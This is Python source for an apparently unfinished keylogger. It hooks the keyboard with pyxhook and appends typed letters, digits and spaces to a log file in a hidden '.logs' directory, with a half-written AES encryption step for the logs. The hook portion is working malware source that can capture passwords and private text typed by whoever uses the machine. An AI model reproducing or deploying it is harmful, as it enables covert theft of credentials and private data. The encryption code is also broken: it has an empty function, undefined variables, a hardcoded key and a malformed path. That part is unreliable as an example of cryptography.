import pyxhook
import sys
import os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import ElGamal

def key_exchange():


def encrypt():
    enc_log_path = create_path(True)

    #Generate shared Sk
    key = b'Sixteen byte key'
    #Generate IV

    # --- Key exchange??? --- uhhhhh 

    iv  = Random.new.read(AES.block_size)
    #set cipher using key, CBC mode, and IV
    cipher = AES.new(key, AES.MODE_CBC, iv)


    #msg  = get_logs()

    #convert message to byte data, encrypt
    byte_str = bytes(msg, 'ascii') 
    enc_msg  = iv + cipher.encrypt(bmsg)

    return enc_msg

'''
Input : bool
Output: string

Functionality:
    if we enable encryption:
        -get pwd
        -create hidden file called enc_content.log
    else:
        - same as above but we create a file called content.log
'''

def create_path(encrypted=False):
    current_path = os.getcwd()

    path = os.path.abspath(current_path + "/.logs")
    if not os.path.exists(path):
        print ("PATH DNE")
        os.makedirs(path)
    
    if encrypted==True:
        return path + "enc_content.log"
    else:
        return path + "/content.log"

'''
Input : pyHook keyboard down event object
Output: Void

Functionality:
    -Takes in a "pressed key object" 
    - if ascii value of the key is a character, space, number
        - writes to file
    - else
        - disregards
'''
def OnKeyPress(event):
    log_path = create_path()
    with open(log_path, 'a+') as file:
        if ((event.Ascii >= 48 and event.Ascii <= 57) or (event.Ascii >= 65 and event.Ascii <= 90) or (event.Ascii >= 97) and (event.Ascii <= 122)):
            file.write(event.Key)
        elif (event.Ascii == 32):
            file.write(" ")
        elif event.Ascii == 10:
            file.write("\n")
        else:
            pass


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()